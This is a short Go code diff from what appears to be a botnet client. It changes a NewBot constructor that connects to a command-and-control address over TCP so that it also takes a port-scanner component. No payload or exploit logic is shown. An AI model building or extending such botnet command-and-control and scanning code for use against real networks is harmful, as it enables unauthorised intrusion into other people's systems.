@@ -21,7 +21,7 @@ type BotService struct {
 }
 
 //NewBot is
-func NewBot(ccAddr string) (*BotService, error) {
+func NewBot(ccAddr string, portscan botnet.PortScanner) (*BotService, error) {
 	conn, err := net.Dial("tcp", ccAddr)
 	if err != nil {
 		return nil, fmt.Errorf("%s is not available", ccAddr)
@@ -36,7 +36,9 @@ func NewBot(ccAddr string) (*BotService, error) {
 	conn.Close()
 
 	svc := &BotService{
-		Bot: bot}
+		Bot:         bot,
+		PortScanner: portscan,
+	}
 
 	if err := svc.GenesisCmd(bot); err != nil {
 		return nil, err
